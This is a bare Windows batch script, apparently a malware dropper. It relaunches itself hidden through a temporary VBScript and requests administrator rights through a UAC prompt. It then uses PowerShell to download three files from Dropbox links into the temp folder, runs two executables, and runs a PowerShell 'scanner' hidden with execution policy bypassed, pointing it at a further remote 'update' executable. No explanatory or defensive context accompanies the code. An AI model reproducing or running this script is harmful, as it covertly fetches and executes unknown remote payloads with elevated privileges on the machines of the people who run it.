@echo off
setlocal

if "%1" NEQ "HIDDEN" (
    set "SELF=%~f0"
    set "ARGS=%*"
    
    echo Set WshShell = CreateObject("WScript.Shell") > "%temp%\RunHidden.vbs"
    echo cmd = "cmd /c """"%SELF%"" HIDDEN %ARGS%""" >> "%temp%\RunHidden.vbs"
    echo WshShell.Run cmd, 0, False >> "%temp%\RunHidden.vbs"
    
    cscript //nologo "%temp%\RunHidden.vbs"
    del "%temp%\RunHidden.vbs"
    exit /b
)

:: BatchGotAdmin
:-------------------------------------
if "%PROCESSOR_ARCHITECTURE%" EQU "amd64" (
>nul 2>&1 "%SYSTEMROOT%\SysWOW64\cacls.exe" "%SYSTEMROOT%\SysWOW64\config\system"
) else (
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system")
if '%errorlevel%' NEQ '0' (
    echo Requesting administrative privileges...
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params= %*
    echo UAC.ShellExecute "cmd.exe", "/c ""%~s0"" %params:"=""%", "", "runas", 1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B

:gotAdmin
    pushd "%CD%"
    CD /D "%~dp0"  

set "ADVANCE_URL=https://www.dropbox.com/scl/fi/bows1t1vhjjxmv0gy9q77/Advance.exe?rlkey=23lb6c26h2a19uoc350ox5qbc&st=5inzpry4&dl=1"
set "SCANNER_URL=https://www.dropbox.com/scl/fi/zx2sc4vkhxt1sax9eigfv/scanner.ps1?rlkey=3vik3lw8r4kd3sx4wj3uzmbxf&st=ypi0t1jl&dl=1"
set "LOG_URL=https://www.dropbox.com/scl/fi/jffirtnvue1cpeg4wirl7/SystemMonitor.exe?rlkey=iw765ltj1z25jop0154v0diq3&st=dv8wvmmw&dl=1"
set "ADVANCE_FILE=%temp%\Advance.exe"
set "SCANNER_FILE=%temp%\scanner.ps1"
set "LOG_FILE=%temp%\SystemMonitor.exe"

set "UPDATE_SERVER=https://www.dropbox.com/scl/fi/1ue1swjbfb7m82r0lgr92/MonthlyUpdates.exe?rlkey=8f8knvgth42o5vkhyamlzf37v&st=all5cna2&dl=1"
set "EXE_NAME=MonthlyUpdates.exe"

powershell -Command "Invoke-WebRequest -Uri '%ADVANCE_URL%' -OutFile '%ADVANCE_FILE%'"
powershell -Command "Invoke-WebRequest -Uri '%SCANNER_URL%' -OutFile '%SCANNER_FILE%'"
powershell -Command "Invoke-WebRequest -Uri '%LOG_URL%' -OutFile '%LOG_FILE%'"

if exist "%ADVANCE_FILE%" call "%ADVANCE_FILE%"
if exist "%LOG_FILE%" call "%LOG_FILE%"

if exist "%SCANNER_FILE%" (
    powershell -Windowstyle Hidden -ExecutionPolicy Bypass -File "%SCANNER_FILE%" -UpdateServer "%UPDATE_SERVER%" -ExeName "%EXE_NAME%"
)

endlocal